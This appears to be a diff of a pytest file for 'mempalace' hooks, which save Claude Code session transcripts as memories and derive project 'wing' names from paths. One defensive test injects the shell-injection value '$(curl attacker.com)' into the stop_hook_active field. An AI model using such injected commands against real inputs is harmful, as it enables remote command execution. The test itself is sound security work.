@@ -4,26 +4,43 @@ import json
 import os
 import subprocess
 from pathlib import Path
-from unittest.mock import patch
+from unittest.mock import MagicMock, patch
 
 import pytest
 
 from mempalace.hooks_cli import (
     SAVE_INTERVAL,
-    STOP_BLOCK_REASON,
     _count_human_messages,
+    _extract_recent_messages,
     _get_mine_dir,
     _log,
     _maybe_auto_ingest,
+    _mempalace_python,
     _mine_already_running,
     _parse_harness_input,
     _sanitize_session_id,
     _validate_transcript_path,
+    _wing_from_transcript_path,
     hook_stop,
     hook_session_start,
     hook_precompact,
     run_hook,
 )
+
+
+# --- _mempalace_python ---
+
+
+def test_mempalace_python_returns_string():
+    result = _mempalace_python()
+    assert isinstance(result, str)
+    assert "python" in result
+
+
+def test_mempalace_python_finds_venv():
+    """Should resolve to a valid Python interpreter path."""
+    result = _mempalace_python()
+    assert result and "python" in os.path.basename(result).lower()
 
 
 # --- _sanitize_session_id ---
@@ -109,17 +126,57 @@ def test_count_malformed_json_lines(tmp_path):
     assert _count_human_messages(str(transcript)) == 1
 
 
+# --- _extract_recent_messages ---
+
+
+def test_extract_recent_messages_basic(tmp_path):
+    transcript = tmp_path / "t.jsonl"
+    _write_transcript(
+        transcript,
+        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(5)],
+    )
+    msgs = _extract_recent_messages(str(transcript), count=3)
+    assert len(msgs) == 3
+    assert msgs[0] == "msg 2"
+    assert msgs[2] == "msg 4"
+
+
+def test_extract_recent_messages_skips_commands(tmp_path):
+    transcript = tmp_path / "t.jsonl"
+    _write_transcript(
+        transcript,
+        [
+            {"message": {"role": "user", "content": "real msg"}},
+            {"message": {"role": "user", "content": "<command-message>status</command-message>"}},
+            {"message": {"role": "user", "content": "<system-reminder>hook</system-reminder>"}},
+        ],
+    )
+    msgs = _extract_recent_messages(str(transcript))
+    assert len(msgs) == 1
+    assert msgs[0] == "real msg"
+
+
+def test_extract_recent_messages_missing_file():
+    assert _extract_recent_messages("/nonexistent.jsonl") == []
+
+
 # --- hook_stop ---
 
 
 def _capture_hook_output(hook_fn, data, harness="claude-code", state_dir=None):
     """Run a hook and capture its JSON stdout output."""
     import io
+    from unittest.mock import PropertyMock
 
     buf = io.StringIO()
     patches = [patch("mempalace.hooks_cli._output", side_effect=lambda d: buf.write(json.dumps(d)))]
     if state_dir:
         patches.append(patch("mempalace.hooks_cli.STATE_DIR", state_dir))
+    # Mock MempalaceConfig so tests don't depend on user's ~/.mempalace/config.json
+    mock_config = MagicMock()
+    type(mock_config).hook_silent_save = PropertyMock(return_value=True)
+    type(mock_config).hook_desktop_toast = PropertyMock(return_value=False)
+    patches.append(patch("mempalace.config.MempalaceConfig", return_value=mock_config))
     with contextlib.ExitStack() as stack:
         for p in patches:
             stack.enter_context(p)
@@ -161,19 +218,43 @@ def test_stop_hook_passthrough_below_interval(tmp_path):
     assert result == {}
 
 
-def test_stop_hook_blocks_at_interval(tmp_path):
+def test_stop_hook_saves_silently_at_interval(tmp_path):
     transcript = tmp_path / "t.jsonl"
     _write_transcript(
         transcript,
         [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
     )
-    result = _capture_hook_output(
-        hook_stop,
-        {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
-        state_dir=tmp_path,
+    save_result = {"count": 15, "themes": ["hooks", "notifications"]}
+    with patch("mempalace.hooks_cli._save_diary_direct", return_value=save_result) as mock_save:
+        result = _capture_hook_output(
+            hook_stop,
+            {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
+            state_dir=tmp_path,
+        )
+    # Saves silently — systemMessage notification with themes, no block
+    assert result["systemMessage"].startswith("\u2726 15 memories woven into the palace")
+    assert "hooks" in result["systemMessage"]
+    # tmp_path has no "-Projects-" segment, so _wing_from_transcript_path falls back to "wing_sessions"
+    mock_save.assert_called_once_with(str(transcript), "test", wing="wing_sessions", toast=False)
+
+
+def test_stop_hook_derives_wing_from_transcript_path(tmp_path):
+    """When transcript path looks like a Claude Code path, wing is derived from it."""
+    project_dir = tmp_path / ".claude" / "projects" / "-home-jp-Projects-myproject"
+    project_dir.mkdir(parents=True)
+    transcript = project_dir / "session.jsonl"
+    _write_transcript(
+        transcript,
+        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
     )
-    assert result["decision"] == "block"
-    assert result["reason"] == STOP_BLOCK_REASON
+    save_result = {"count": 15, "themes": []}
+    with patch("mempalace.hooks_cli._save_diary_direct", return_value=save_result) as mock_save:
+        _capture_hook_output(
+            hook_stop,
+            {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
+            state_dir=tmp_path,
+        )
+    mock_save.assert_called_once_with(str(transcript), "test", wing="wing_myproject", toast=False)
 
 
 def test_stop_hook_tracks_save_point(tmp_path):
@@ -184,13 +265,17 @@ def test_stop_hook_tracks_save_point(tmp_path):
     )
     data = {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)}
 
-    # First call blocks
-    result = _capture_hook_output(hook_stop, data, state_dir=tmp_path)
-    assert result["decision"] == "block"
+    # First call saves silently with systemMessage notification
+    save_result = {"count": 15, "themes": ["hooks"]}
+    with patch("mempalace.hooks_cli._save_diary_direct", return_value=save_result):
+        result = _capture_hook_output(hook_stop, data, state_dir=tmp_path)
+    assert "systemMessage" in result
 
     # Second call with same count passes through (already saved)
-    result = _capture_hook_output(hook_stop, data, state_dir=tmp_path)
+    with patch("mempalace.hooks_cli._save_diary_direct") as mock_save:
+        result = _capture_hook_output(hook_stop, data, state_dir=tmp_path)
     assert result == {}
+    mock_save.assert_not_called()
 
 
 # --- hook_session_start ---
@@ -217,7 +302,109 @@ def test_precompact_allows(tmp_path):
     assert result == {}
 
 
+# --- _wing_from_transcript_path ---
+
+
+def test_wing_from_transcript_path_extracts_project():
+    path = "/home/jp/.claude/projects/-home-jp-Projects-memorypalace/session.jsonl"
+    assert _wing_from_transcript_path(path) == "wing_memorypalace"
+
+
+def test_wing_from_transcript_path_fallback():
+    assert _wing_from_transcript_path("/some/random/path.jsonl") == "wing_sessions"
+
+
+def test_wing_from_transcript_path_windows_backslashes():
+    path = "C:\\Users\\jp\\.claude\\projects\\-home-jp-Projects-myapp\\session.jsonl"
+    assert _wing_from_transcript_path(path) == "wing_myapp"
+
+
+def test_wing_from_transcript_path_lowercases():
+    path = "/home/jp/.claude/projects/-home-jp-Projects-MyProject/session.jsonl"
+    assert _wing_from_transcript_path(path) == "wing_myproject"
+
+
+def test_wing_from_transcript_path_non_projects_layout():
+    # Linux users with code under ~/dev/, ~/src/, ~/code/ — no -Projects- segment.
+    # Project name is the final dash-separated token of the encoded folder.
+    path = "/home/igor/.claude/projects/-home-igor-dev-MemPalace-mempalace/session.jsonl"
+    assert _wing_from_transcript_path(path) == "wing_mempalace"
+
+
+def test_wing_from_transcript_path_macos_users_layout():
+    # macOS ~/ layout without a Projects/ segment.
+    path = "/Users/alice/.claude/projects/-Users-alice-code-MyApp/session.jsonl"
+    assert _wing_from_transcript_path(path) == "wing_myapp"
+
+
+def test_wing_from_transcript_path_nested_deep():
+    path = "/home/bob/.claude/projects/-home-bob-work-clients-acme-frontend/session.jsonl"
+    assert _wing_from_transcript_path(path) == "wing_frontend"
+
+
 # --- _log ---
+
+
+def test_output_writes_to_real_stdout_fd_when_mcp_server_loaded():
+    """_output() must reach fd 1 even when mcp_server has redirected sys.stdout."""
+    import types
+
+    fake_module = types.ModuleType("mempalace.mcp_server")
+
+    read_fd, write_fd = os.pipe()
+    try:
+        fake_module._REAL_STDOUT_FD = write_fd
+        with patch.dict("sys.modules", {"mempalace.mcp_server": fake_module}):
+            from mempalace.hooks_cli import _output
+
+            _output({"systemMessage": "test"})
+
+        os.close(write_fd)
+        written = b""
+        while True:
+            chunk = os.read(read_fd, 4096)
+            if not chunk:
+                break
+            written += chunk
+    finally:
+        os.close(read_fd)
+
+    data = json.loads(written.decode())
+    assert data["systemMessage"] == "test"
+
+
+def test_output_falls_back_to_fd1_when_mcp_server_absent():
+    """_output() writes to fd 1 directly when mcp_server is not loaded."""
+    read_fd, write_fd = os.pipe()
+    try:
+        orig_fd1 = os.dup(1)
+        os.dup2(write_fd, 1)
+        os.close(write_fd)
+        try:
+            modules_without_mcp = {
+                k: v for k, v in __import__("sys").modules.items() if "mcp_server" not in k
+            }
+            with patch.dict("sys.modules", modules_without_mcp, clear=True):
+                from mempalace.hooks_cli import _output
+
+                _output({"continue": True})
+        finally:
+            os.dup2(orig_fd1, 1)
+            os.close(orig_fd1)
+    except Exception:
+        os.close(read_fd)
+        raise
+
+    written = b""
+    while True:
+        chunk = os.read(read_fd, 4096)
+        if not chunk:
+            break
+        written += chunk
+    os.close(read_fd)
+
+    data = json.loads(written.decode())
+    assert data["continue"] is True
 
 
 def test_log_writes_to_hook_log(tmp_path):
@@ -384,12 +571,15 @@ def test_stop_hook_oserror_on_last_save_read(tmp_path):
     )
     # Write invalid content to last save file
     (tmp_path / "test_last_save").write_text("not_a_number")
-    result = _capture_hook_output(
-        hook_stop,
-        {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
-        state_dir=tmp_path,
-    )
-    assert result["decision"] == "block"
+    save_result = {"count": 15, "themes": ["testing"]}
+    with patch("mempalace.hooks_cli._save_diary_direct", return_value=save_result):
+        result = _capture_hook_output(
+            hook_stop,
+            {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
+            state_dir=tmp_path,
+        )
+    assert "systemMessage" in result
+    assert "15 memories" in result["systemMessage"]
 
 
 def test_stop_hook_oserror_on_write(tmp_path):
@@ -403,18 +593,20 @@ def test_stop_hook_oserror_on_write(tmp_path):
     def bad_write_text(*args, **kwargs):
         raise OSError("disk full")
 
+    save_result = {"count": 15, "themes": []}
     with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
-        with patch.object(Path, "write_text", bad_write_text):
-            result = _capture_hook_output(
-                hook_stop,
-                {
-                    "session_id": "test",
-                    "stop_hook_active": False,
-                    "transcript_path": str(transcript),
-                },
-                state_dir=tmp_path,
-            )
-    assert result["decision"] == "block"
+        with patch("mempalace.hooks_cli._save_diary_direct", return_value=save_result):
+            with patch.object(Path, "write_text", bad_write_text):
+                result = _capture_hook_output(
+                    hook_stop,
+                    {
+                        "session_id": "test",
+                        "stop_hook_active": False,
+                        "transcript_path": str(transcript),
+                    },
+                    state_dir=tmp_path,
+                )
+    assert "systemMessage" in result
 
 
 # --- hook_precompact with MEMPAL_DIR ---
@@ -603,22 +795,29 @@ def test_validate_transcript_accepts_platform_native_path(tmp_path):
 
 
 def test_stop_hook_rejects_injected_stop_hook_active(tmp_path):
-    """stop_hook_active with shell injection string should not cause issues."""
+    """stop_hook_active with shell injection string should not cause pass-through.
+
+    Verifies the injected value is not treated as truthy — the save path runs
+    instead of being short-circuited. Mocks _save_diary_direct so we can assert
+    it was invoked regardless of silent vs legacy save mode.
+    """
     transcript = tmp_path / "t.jsonl"
     _write_transcript(
         transcript,
         [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
     )
-    # Simulate a malicious stop_hook_active value
-    result = _capture_hook_output(
-        hook_stop,
-        {
-            "session_id": "test",
-            "stop_hook_active": "$(curl attacker.com)",
-            "transcript_path": str(transcript),
-        },
-        state_dir=tmp_path,
-    )
-    # The injected value is not "true"/"1"/"yes", so the hook should NOT pass through
-    # It should count messages and block at the interval
-    assert result["decision"] == "block"
+    with patch(
+        "mempalace.hooks_cli._save_diary_direct", return_value={"count": 1, "themes": []}
+    ) as mock_save:
+        _capture_hook_output(
+            hook_stop,
+            {
+                "session_id": "test",
+                "stop_hook_active": "$(curl attacker.com)",
+                "transcript_path": str(transcript),
+            },
+            state_dir=tmp_path,
+        )
+    # The injected value is not "true"/"1"/"yes", so the hook should NOT pass through.
+    # Save must have been attempted.
+    assert mock_save.called
